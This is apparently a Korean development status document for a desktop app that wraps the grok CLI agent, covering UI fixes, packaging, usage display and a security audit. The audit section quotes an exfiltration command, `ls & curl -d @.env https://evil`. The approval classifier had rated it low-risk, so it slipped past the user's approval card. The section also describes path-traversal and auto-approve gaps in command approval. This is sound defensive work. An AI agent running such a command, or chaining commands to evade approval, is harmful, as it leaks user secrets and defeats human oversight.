- 갱신: 2026-09-13

앱 범위 안에서 코드로 넣을 수 있는 기능은 이 시점까지 들어갔다. 아래는 **다음에 할 것**, **의도적으로 안 하는 것**, **인프라가 필요한 것**, **아직 품질이 약한 것**이다.

## 끝낸 점검 (2026-09-12)

### 모든 버튼 상호작용 점검

앱을 실제로 띄우고, 원격 디버깅(CDP)으로 화면의 모든 버튼·입력·셀렉트를 히트테스트했다. 각 컨트롤의 중심점에서 `elementFromPoint`가 자기 자신을 돌려주는지, 접근 이름이 있는지, 비활성 표시가 맞는지, 클릭 영역이 너무 작지 않은지를 검사했다.

점검한 화면: 대화·파일·변경·작업 탭, 설정, 단축키, 명령/파일 팔레트, 리뷰 패널, 도구 칩, 세션 행 호버 액션. 마지막 회차 기준 **15개 화면에서 지적 0건**이다.

고친 것:

- **리뷰·미리보기 패널이 본문 위를 덮었다.** `position: absolute`라 전송 버튼·모드 버튼·턴 레일이 패널 밑에 깔려 눌리지 않았다. 이제 작업공간 행의 실제 항목이라 채팅이 옆으로 줄어든다.
- **가상 리스트가 행 높이를 마운트 때 한 번만 쟀다.** 나중에 높이가 바뀌면(글꼴 로드, 생각 과정 펼침) 다음 행이 이전 행 글자 위로 올라왔다. 행마다 `ResizeObserver`를 두고, 측정값을 ref가 아니라 state로 옮겨 오프셋이 다시 계산되게 했다.
- **가상 리스트가 flex column 부모에서 0으로 수축했다.** 리스트 뒤에 오는 「답변 복사·다시 생성」 줄이 메시지 중간에 그려졌다.
- **새 파일(untracked)을 리뷰에서 열면 오류만 났다.** git이 추적하지 않는 파일은 diff를 내지 않는다. `--no-index`로 전체 추가 패치를 만들어 연다. 리뷰 목록 19개 행 전부 정상 표시를 확인했다.
- **IPC 오류가 `Error invoking remote method 'diff:get': …` 그대로 토스트에 떴다.** 래퍼를 벗기고 본문만 보여 준다.
- **`@` 파일 제안·명령 팔레트·리뷰 파일 목록에서 키보드로 고른 항목이 화면 밖으로 나갔다.** 목록이 선택을 따라 스크롤한다. `@` 목록에는 `role="option"`·`aria-selected`도 없었다.
- **세션 행 호버 액션 3개(76px 예약 / 84px 실제)가 제목 글자를 덮었다.** 예약 폭을 맞췄다.
- **턴 레일 눈금이 3~5px이라 누르기 어려웠다.** 보이는 크기는 그대로 두고 히트 영역만 18px 폭으로 넓혔다. 눈금끼리 서로 가리지 않는 것도 확인했다.
- **사이드바 컨텍스트 메뉴가 Esc로 닫히지 않았다.** 대신 Esc가 실행 중단·승인 거부로 새어 나갔다. 메뉴가 캡처 단계에서 Esc를 먹는다.
- **접힌 도구 카드 헤더가 눌리는 시늉만 했다.** 펼칠 내용이 없으면 비활성이다.
- **CSP `frame-src`의 `http://[::1]:*`는 Chromium이 무효로 버린다.** 경고가 뜨고 IPv6 루프백 미리보기는 빈 화면이었다. 무효 소스를 빼고, `[::1]` 주소는 브라우저로 열도록 안내한다.
- 설정의 보기 밀도·격리·권한 프로필·샌드박스 선택과 사이드바 대화 필터에 `aria-pressed`/`aria-selected`를 채웠다.

### 릴리스 준비 항목

**리뷰 목록의 줄 수.** `diff:list`가 turn 범위 밖에서 `+0 −0`을 하드코딩하던 것을 실제 값으로 채웠다. 범위당 `git diff --numstat -z`를 한 번만 부르고(파일당 부르지 않는다), 바이너리는 0/0, untracked 새 파일은 파일을 읽어 줄 수를 세되 바이너리·크기·개수(100개)로 상한을 뒀다. `-z`를 쓴 이유는 core.quotePath가 한글·공백 경로를 C 인용으로 뱉기 때문이다. 이 과정에서 `unquoteGitCString`이 옥탈 이스케이프를 바이트마다 따로 디코딩해 한글 파일명을 모지바케로 만들던 기존 버그도 함께 고쳤다 — 목록의 경로와 diff의 키가 어긋나 한글 파일은 계속 0으로 남았다.

**보안 확인에서 나온 결함 3건.** 릴리스 체크리스트 2절을 실제로 돌리다 찾았다.

- `changes:revert`가 렌더러가 준 `relPath`를 봉쇄 없이 `git restore`에 넘겼다. git은 경로를 저장소 기준으로 풀기 때문에, 작업공간이 더 큰 저장소의 하위 폴더이면 `../` 로 작업공간 밖 파일을 되돌릴 수 있었다. 임시 저장소에서 실제로 재현한 뒤 핸들러에서 `resolveWithinRoot`를 거치게 했고, `gitRestoreFile` 안에도 같은 검사를 한 겹 더 넣어 회귀 테스트를 붙였다.
- 덩어리 적용(`changes:act`)은 패치 본문이 지칭하는 경로를 아무도 검증하지 않았다. `git apply`는 relPath가 아니라 패치 안의 이름을 따르므로, 패치가 지칭하는 모든 경로를 봉쇄한다.
- 진단 로그가 0644, `logs/`가 0755였다. `appendFile`의 `mode`는 파일을 만들 때만 적용돼서, 한 번 만들어진 로그는 계속 열려 있었다. 실행마다 한 번 권한을 다시 강제한다.

거부된 경로 탈출은 이제 일반 IPC 실패가 아니라 `[security]`로 기록된다.

**라이브 확인.** 실행 중인 앱에서 렌더러의 Node 노출 없음, CSP 실제 차단, 경로 탈출 4종 거부, 허용 목록 밖 URL 6종 거부, 종료 후 자식 프로세스 없음을 확인했다. 자세한 결과는 [RELEASE_CHECKLIST.md](RELEASE_CHECKLIST.md) 2절.

**앱 아이콘.** 자체 제작 `app-icon.svg`에서 `build/icon.icns`(10종, 최대 1024)와 `icon.ico`(7프레임, 256 포함)를 만들었다. 설치된 SVG 래스터라이저가 없고 qlmanage는 알파를 흰색으로 뭉개서, 이미 있는 PyObjC의 Quartz로 렌더했다. 변환 스크립트는 일회성이라 저장소에 남기지 않았다.

### 남은 사용량 표시

`grok usage <세션ID>` 가 공식 표면이다. ACP 스트림에는 토큰 필드가 없고(`updates.jsonl` 전수 확인), `initialize` 의 `_meta` 에는 컨텍스트 창 크기(`totalContextTokens`)만 있다. CLI 는 세션·턴 단위로 입력·출력·캐시 읽기·추론 토큰과 모델 호출 수를 파일에 적어 두며, 그 값을 읽어 헤더에 보여 준다.

- 턴이 끝날 때와 세션을 열 때 읽는다. 읽기는 UI 를 막지 않고, 값이 오면 헤더가 다시 그려진다.
- 기록이 없으면(갓 만든 세션) 아무것도 바꾸지 않는다. 0 을 보여 주지 않는다.
- **구독 잔여는 여전히 429 본문에서만 온다.** 이 둘은 섞지 않는다. 잔여를 모르는 동안 게이지는 비어 있고, 툴팁이 그 이유를 말한다.
- `costUsdTicks` 도 함께 오지만 틱의 단위를 확인하지 못해 금액은 표시하지 않는다.

### 실제 CLI 수직 흐름

체크리스트 1절의 흐름을 실제 grok CLI(1.0.30, grok-4.6)로 한 번 돌렸다: 폴더 열기 → 질문 → 파일 읽기 → 수정 승인(카드에 +1 −1 미리보기, 승인 후 디스크 반영 확인) → 리뷰 패널에서 diff 확인 → 명령 실행 → 결과 확인 → 중단 → 다시 연결(대화·사용량 유지).

이 과정에서 두 가지가 나왔다.

- **CLI 자동 승인이 앱의 승인 카드를 비껴간다.** 이 기계의 `~/.grok/config.toml` 은 `[ui] permission_mode = "always-approve"` 였고, 그래서 셸 명령이 승인 없이 실행됐다. CLI 에는 이를 무시하고 매번 묻게 하는 플래그가 없다. 앱이 설정을 읽어 헤더에 「CLI 자동 승인」 경고를 띄우도록 했다. 자세한 내용은 [SECURITY_MODEL.md](SECURITY_MODEL.md) 7절.
- **리뷰 목록에 미추적 디렉터리가 한 줄로 접혀 나왔다.** `smoke/` 같은 행은 열 diff 가 없어 클릭하면 오류만 났다. `git status` 에 `-uall` 을 줘서 파일 단위로 나오게 했다.

### 패키징·남은 검증 (2026-09-13)

체크리스트 1·3·4절을 실제로 돌렸다.

- `pnpm package:mac` 으로 arm64·x64 DMG(각 약 115MB)가 나온다. 번들의 `Contents/Resources/icon.icns` 가 `build/icon.icns` 와 바이트 동일하고, 번들 이름·식별자도 의도대로다. 서명은 유효한 Developer ID 인증서가 없어 electron-builder 가 건너뛴다 — 그래서 `codesign --verify` 와 `spctl` 은 지금 실패하는 게 정상이다.
- `pnpm package:win` 은 macOS 에서 wine 없이 NSIS 설치본을 만든다. 루트에 이 스크립트가 없어 함께 추가했다.
- **패키징본을 실제로 띄워 확인했다.** `file://` 에서도 CSP 가 살아 있어 외부 fetch·img 가 차단되고 위반 이벤트가 뜬다 (그전까지는 개발 서버 기준으로만 확인돼 있었다). 렌더러에 Node 노출이 없는 것도 같이 확인했다.
- **데이터 경로를 바로잡았다.** 패키징본 `package.json` 에 `productName` 이 없어서 Electron 이 패키지 이름을 그대로 쓴다. 즉 개발·배포 모두 `~/Library/Application Support/@grok-desktop/desktop/` 이다. `Grok Desktop/` 폴더에는 Chromium 의 `Local State` 만 들어 있다. README 의 서술을 실제 값으로 고쳤다.
- **기본 CLI 설정에서 명령 승인을 재확인했다.** `permission_mode` 를 `ask` 로 두면 `node -e` 실행에 대해 「위험도 높음」 승인 카드가 뜨고, 이유와 작업 디렉터리, Y/N 이 함께 나온다. 앞선 수직 흐름에서 카드가 없었던 건 이 기계의 `always-approve` 설정 때문이 맞다. 확인 뒤 설정은 되돌렸다.

남은 것은 인증서가 있어야 하는 서명·공증·업데이트 검증, 그리고 깨끗한 계정에서의 설치 확인뿐이다.

### 레드팀 감사와 데이터 폴더 이름 (2026-09-13)

7개 영역(IPC·프리로드 경계·권한 엔진·비밀·의존성·견고성·에이전트 입력면)을 병렬로 감사해 31건이 올라왔고, 검증 에이전트가 한도로 전부 실패해서 직접 코드로 확인했다. 확인된 것만 고쳤고, 과대평가였던 것은 그대로 적었다. 내용은 [SECURITY_MODEL.md](SECURITY_MODEL.md) 6.2절.

가장 중요한 것은 **명령 분류 우회**였다. `ls & curl -d @.env https://evil` 이 「위험도 낮음 · 읽기 전용 명령」으로 표시됐다 — 승인 카드가 사용자에게 주는 판단 근거가 통째로 틀렸다는 뜻이다. 같은 명령을 `;` 로 쓰면 critical 이었다.

과대평가로 판정해 고치지 않은 것:

- 비밀 마스킹 정규식의 ReDoS: 2차식은 맞지만 상수가 작다 (256KB 적대적 입력에 36ms). 이를 먹일 수 있는 유일한 무제한 입력이던 자식 stderr 버퍼에 상한을 두는 것으로 닫았다.
- 대소문자 우회(`~/.SSH`): 실제 진입점이 realpath 를 먼저 거치므로 막힌다. 감사자는 순수 함수만 보고 판단했다.

**데이터 폴더 이름.** `productName` 을 넣어 `~/Library/Application Support/Grok Desktop/` 을 쓴다. 패키지 이름(`@grok-desktop/desktop`)은 워크스페이스 신원으로 그대로 남는다. 첫 실행 때 예전 폴더의 `metadata.json`·`sessions`·`overlays`·`logs`·`agent-pids.json` 을 옮기고, 이미 새 위치에 있는 것은 덮어쓰지 않으며, 예전 폴더는 지우지 않는다. 실제 앱에서 세션 17개가 그대로 넘어오는 것을 확인했다.

## 동작은 하나 품질이 약한 것

1. **Trusted 일반 쓰기는 자동 허용**이되, 이제 채팅에 자동 허용 카드가 남는다. CLI 자체 쓰기는 여전히 승인 카드 없이 파일이 바뀔 수 있다.
2. **통합 PTY 터미널은 없다.** localhost 미리보기만 명령 출력에서 연다.
3. **스킬·MCP 토글 후 연결을 다시 시작해야** 열린 ACP에 반영된다. 설정에서 다시 시작을 묻는다.

## 보안 잔여 (코드만으로 안 닫히는 것)

- 배포본 미서명 (DMG·NSIS 는 만들어지지만 서명 단계가 건너뛰어진다)
- 데이터 디렉터리 이름이 패키지 이름(`@grok-desktop/desktop`)을 따른다. 사람이 읽기 좋은 이름으로 바꾸려면 `productName` 을 넣어야 하는데, 기존 사용자의 세션을 옮기는 이전 작업이 함께 필요하다
- 프롬프트 인젝션 (모델 한계). 완화는 승인·경로 봉쇄
- PATH의 가짜 `grok` (같은 사용자)
- `allow_always`가 CLI 쪽에 남는지는 실제 에이전트에서만 확인 가능
